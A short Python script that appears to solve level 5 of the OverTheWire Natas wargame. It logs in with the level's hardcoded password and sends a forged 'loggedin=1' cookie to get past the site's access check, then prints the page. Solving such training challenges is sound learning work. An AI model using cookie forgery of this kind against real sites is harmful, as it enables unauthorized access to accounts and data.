import requests

user_name = "natas5"
password = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"

url = f"http://{user_name}.natas.labs.overthewire.org"

cookie = {"loggedin" : "1"}

session = requests.Session()

response = session.get(url, auth = (user_name, password), cookies = cookie)
content = response.text


print(content)

